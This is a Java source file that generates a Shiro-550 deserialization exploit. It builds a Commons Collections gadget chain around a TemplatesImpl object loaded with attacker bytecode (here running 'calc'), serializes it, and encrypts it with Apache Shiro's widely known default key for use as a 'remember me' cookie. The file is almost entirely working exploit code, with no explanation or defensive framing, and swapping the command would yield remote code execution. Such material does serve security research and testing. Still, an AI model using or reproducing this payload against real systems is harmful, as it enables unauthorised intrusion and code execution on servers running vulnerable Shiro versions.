package Seri;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Shiro550CC6 {
    public static void main(String[] args) throws Exception {

        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates ,"_name" ,"xxx");
        Utils.setValue(templates ,"_class" ,null);
        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer(
                "useServicesMechnism" ,
                null ,null
                );

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap ,transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap ,templates);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry ,"tmpValue");

        outerMap.clear();

        Utils.setValue(transformer ,"iMethodName" ,"newTransformer");

        String payload = Utils.serialize(hashMap ,"bin/shiro550CC6");
        String key = "kPH+bIxk5D2deZiIxcaaaA==";

        AesCipherService aes = new AesCipherService();
        byte[] keyBytes = Base64.getDecoder().decode(key);
        System.out.println(aes.encrypt(Base64.getDecoder().decode(payload) , keyBytes).toString());

//        Utils.unserialize("bin/shiro550CC6");

    }
}
